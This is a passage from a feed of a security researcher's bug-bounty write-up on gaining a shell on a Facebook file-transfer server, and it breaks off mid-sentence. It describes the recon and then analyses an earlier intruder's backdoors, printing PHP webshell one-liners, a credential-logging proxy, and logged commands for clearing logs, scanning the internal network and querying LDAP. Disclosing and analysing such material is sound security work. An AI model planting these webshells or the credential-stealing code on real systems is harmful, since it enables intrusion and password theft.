                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook, and Found Someone's Backdoor Script</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someoneâ€™s Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;æ»²é€ Facebook çš„æ€è·¯èˆ‡ç™¼ç¾&lt;/a&gt; (ä¸­æ–‡ç‰ˆæœ¬)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;foreword&quot;&gt;Foreword&lt;/h3&gt;

&lt;p&gt;As a pentester, I love server-side vulnerabilities more than client-side ones. Why? Because itâ€™s way much cooler to take over the server directly and gain system SHELL privileges. &amp;lt;(ï¿£ï¸¶ï¿£)&amp;gt;&lt;/p&gt;

&lt;p&gt;Of course, both vulnerabilities from the server-side and the client-side are indispensable in a perfect penetration test. Sometimes, in order to take over the server more elegantly, it also need some client-side vulnerabilities to do the trick. But speaking of finding vulnerabilities, I prefer to find server-side vulnerabilities first.&lt;/p&gt;

&lt;p&gt;With the growing popularity of Facebook around the world, Iâ€™ve always been interested in testing the security of Facebook. Luckily, in 2012, Facebook launched the &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty Program&lt;/a&gt;, which even motivated me to give it a shot.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;From a pentesterâ€™s view, I tend to start from recon and do some research. First, Iâ€™ll determine how large is the â€œterritoryâ€ of the company on the internet, thenâ€¦try to find a nice entrance to get in, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What can I find by Google Hacking?&lt;/li&gt;
  &lt;li&gt;How many B Class IP addresses are used? How many C Class IPs?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;What domain names are used? What are their internal domain names? Then proceed with enumerating sub-domains&lt;/li&gt;
  &lt;li&gt;What are their preferred techniques and equipment vendors?&lt;/li&gt;
  &lt;li&gt;Any data breach on Github or Pastebin?&lt;/li&gt;
  &lt;li&gt;â€¦etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Of course, Bug Bounty is nothing about firing random attacks without restrictions. By comparing your findings with the permitted actions set forth by Bug Bounty, the overlapping part will be the part worth trying.&lt;/p&gt;

&lt;p&gt;Here Iâ€™d like to explain some common security problems found in large corporations during pentesting by giving an example.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;For most enterprises, â€œ&lt;strong&gt;Network Boundary&lt;/strong&gt;â€ is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, itâ€™s impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. Thatâ€™s why luck is often on the attackerâ€™s side: a vulnerable server on the â€œborderâ€ is enough to grant a ticket to the internal network!&lt;/li&gt;
  &lt;li&gt;Lack of awareness in â€œ&lt;strong&gt;Networking Equipment&lt;/strong&gt;â€ protection. Most networking equipment doesnâ€™t offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.&lt;/li&gt;
  &lt;li&gt;Security of people: now we have witnessed the emergence of the â€œ&lt;strong&gt;Breached Database&lt;/strong&gt;â€ (aka â€œ&lt;strong&gt;Social Engineering Database&lt;/strong&gt;â€ in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN accessâ€¦then voilÃ ! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Manâ€™s password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW seemed to stand for â€œ&lt;strong&gt;TheFacebook Network&lt;/strong&gt;â€&lt;br /&gt;
Then I found bellow server through public data&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;WOW. When I accessed vpn.tfbnw.net thereâ€™s the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploitedâ€¦nevertheless, it brought up the beginning of the following story.&lt;/p&gt;

&lt;p&gt;It looked like TFBNW was an internal domain name for Facebook. Letâ€™s try to enumerate the C Class IPs of vpn.tfbnw.net and found some interesting servers, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the info of these servers, I thought that these C Class IPs were relatively important for Facebook. Now, the whole story officially starts here.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;vulnerability-discovery&quot;&gt;Vulnerability Discovery&lt;/h3&gt;

&lt;p&gt;I found a special server among these C Class IPs.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;
&lt;em&gt;â†‘ Login Interface of files.fb.com&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Judging from the LOGO and Footer, this seems to be Accellionâ€™s Secure File Transfer (hereafter known as FTA)&lt;/p&gt;

&lt;p&gt;FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.&lt;/p&gt;

&lt;p&gt;Upon seeing this, the first thing I did was searching for publicized exploits on the internet. The latest one was found by HD Moore and made public on this Rapid7â€™s Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Whether this vulnerability is exploitable can be determined by the version information leaked from â€œ&lt;strong&gt;/tws/getStatus&lt;/strong&gt;â€. At the time I discovered files.fb.com the defective v0.18 has already been updated to v0.20. But from the fragments of source code mentioned in the Advisory, I felt that with such coding style there should still be security issues remained in FTA if I kept looking. Therefore, I began to look for 0-Day vulnerabilities on FTA products!&lt;/p&gt;

&lt;p&gt;Actually, from black-box testing, I didnâ€™t find any possible vulnerabilities, and I had to try white-box testing. After gathering the source codes of previous versions FTA from several resources I could finally proceed with my research!&lt;/p&gt;

&lt;p&gt;The FTA Product&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Web-based user interfaces were mainly composed of Perl &amp;amp; PHP&lt;/li&gt;
  &lt;li&gt;The PHP source codes were encrypted by IonCube&lt;/li&gt;
  &lt;li&gt;Lots of Perl Daemons in the background&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or itâ€™s gonna be messyâ€¦&lt;/p&gt;

&lt;p&gt;After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T&lt;br /&gt;
And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!&lt;/p&gt;

&lt;p&gt;Finally, I found 7 vulnerabilities, including&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Apart from reporting to Facebook Security Team, other vulnerabilities were submitted to Accellion Support Team in Advisory for their reference. After vendor patched, I also sent these to CERT/CC and they assigned 4 CVEs for these vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;More details will be published after full disclosure policy!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;
&lt;em&gt;â†‘ Using Pre-Auth SQL Injection to Write Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P&lt;/p&gt;

&lt;p&gt;There are some restrictions on the server:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Firewall outbound connection unavailable, including TCP, UDP, port 53, 80 and 443&lt;/li&gt;
  &lt;li&gt;Remote Syslog server&lt;/li&gt;
  &lt;li&gt;Auditd logs enabled&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Although the outbound connection was not available, but it looked like ICMP Tunnel was working. Nevertheless, this was only a Bug Bounty Program, we could simply control the server with a webshell.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;was-there-something-strange&quot;&gt;Was There Something Strange?&lt;/h3&gt;

&lt;p&gt;While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.&lt;/p&gt;

&lt;p&gt;First of all I found some strange PHP error messages in â€œ&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;â€&lt;br /&gt;
These error messages seemed to be caused by modifying codes online?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
&lt;em&gt;â†‘ PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous â€œvisitorsâ€.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;
&lt;em&gt;â†‘ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;some contents of the files are as follows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Right, THAT &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;c&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f][&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;], basename(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES[&quot;f&quot;][&quot;name&quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/remote.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sclient_user_class_standard.inc.orig&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Y-m-d H:i:s T&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_USER_AGENT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;POST=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;GET=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;COOKIE=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The first few ones were typical PHP one-line backdoor and thereâ€™s one exception: â€œ&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;â€&lt;/p&gt;

&lt;p&gt;In include_once â€œ&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;â€ was the original PHP app for password verification, and the hacker created a proxy in between to log GET, POST, COOKIE values while some important operations were under way.&lt;/p&gt;

&lt;p&gt;A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;From this info we can see that apart from the logged credentials there were also contents of letters requesting files from FTA, and these logged credentials were rotated regularly (this will be mentioned later, thatâ€™s kinda cheapâ€¦XD)&lt;/p&gt;

&lt;p&gt;And at the time I discovered these, there were around 300 logged credentials dated between February 1st to 7th, from February 1st, mostly â€œ&lt;strong&gt;@fb.com&lt;/strong&gt;â€ and â€œ&lt;strong&gt;@facebook.com&lt;/strong&gt;â€. Upon seeing it I thought itâ€™s a pretty serious security incident. In FTA, there were mainly two modes for user login&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Regular users sign up: their password hash were stored in the database and hashed encrypted with SHA256+SALT&lt;/li&gt;
  &lt;li&gt;All Facebook employees (@fb.com) used LDAP and authenticated by AD Server&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I believe these logged credentials were real passwords and I &lt;strong&gt;GUESS&lt;/strong&gt; they can access to services such as Mail OWA, VPN for advanced penetrationâ€¦&lt;/p&gt;

&lt;p&gt;In addition, this hacker might be careless:P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The backdoor parameters were passed through GET method and his footprinting can be identified easily in from web log&lt;/li&gt;
  &lt;li&gt;When the hacker was sending out commands, he didnâ€™t take care of STDERR, and left a lot of command error messages in web log which the hackerâ€™s operations could be seen&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;
From access.log, every few days the hacker will clear all the credentials he logged&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&apos; 2&amp;gt;/dev/stdout HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Packing files&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp_list3_2 | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;2&amp;gt;/dev/stdout
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-czvf&lt;/span&gt; files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating internal network architecture&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;p&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;for i in &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &quot;192.168.&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&quot;; done; done&apos; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Use ShellScript to scan internal network but forgot to redirect STDERR XD
&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to connect internal LDAP server&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&apos;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &apos;********&apos; -s base (objectclass=*) 2&amp;gt;/dev/stdout&apos;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to access internal server &lt;br /&gt;
